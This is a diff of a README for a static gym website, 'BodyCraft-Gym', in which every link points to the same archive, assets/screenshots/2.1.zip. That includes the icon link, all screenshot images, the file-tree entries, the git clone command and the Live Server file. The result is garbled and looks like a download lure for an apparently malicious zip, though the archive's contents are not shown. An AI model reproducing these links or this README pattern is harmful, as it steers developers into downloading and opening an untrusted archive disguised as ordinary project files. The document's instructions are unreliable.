@@ -23,7 +23,7 @@
 
 - HTML5
 - CSS3
-- [Remix Icon](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip) (for icons)
+- [Remix Icon](https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip) (for icons)
 
 ---
 
@@ -31,12 +31,12 @@
 
 | Section                | Screenshot |
 |------------------------|------------|
-| 🏠 Landing Page        | ![Landing](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip) |
-| 🧾 Programs Offered     | ![Programs](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip) |
-| 🧑‍🏫 Class Showcase      | ![Class](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip) |
-| 👥 Why Join Us         | ![Joining](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip) |
-| 💰 Pricing Plans       | ![Pricing](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip) |
-| 🌟 Review & Footer     | ![ReviewFooter](https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip) |
+| 🏠 Landing Page        | ![Landing](https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip) |
+| 🧾 Programs Offered     | ![Programs](https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip) |
+| 🧑‍🏫 Class Showcase      | ![Class](https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip) |
+| 👥 Why Join Us         | ![Joining](https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip) |
+| 💰 Pricing Plans       | ![Pricing](https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip) |
+| 🌟 Review & Footer     | ![ReviewFooter](https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip) |
 
 
 
@@ -46,10 +46,10 @@
 
 BodyCraft-Gym/
 ├── assets/ #Images used in site
-├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip # Styling for the full website
-├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip # Main HTML file
-├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip # Project overview
-├── https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip # Contributor behavior guide
+├── https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip # Styling for the full website
+├── https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip # Main HTML file
+├── https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip # Project overview
+├── https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip # Contributor behavior guide
 
 
 ```
@@ -63,7 +63,7 @@ BodyCraft-Gym/
 ### 1. Clone
 
 ```bash
-git clone https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip
+git clone https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip
 cd BodyCraft-Gym
 ```
 
@@ -72,7 +72,7 @@ Any static server works. With VS Code:
 
 Install the Live Server extension
 
-Right-click https://github.com/kaifansariw/BodyCraft-Gym/raw/refs/heads/main/assets/screenshots/2.1.zip → Open with Live Server
+Right-click https://raw.githubusercontent.com/kaifansariw/BodyCraft-Gym/main/assets/screenshots/2.1.zip → Open with Live Server
 
 ### 3. Contribute
 Pick an issue labelled Level 1, Level 2, or Level 3
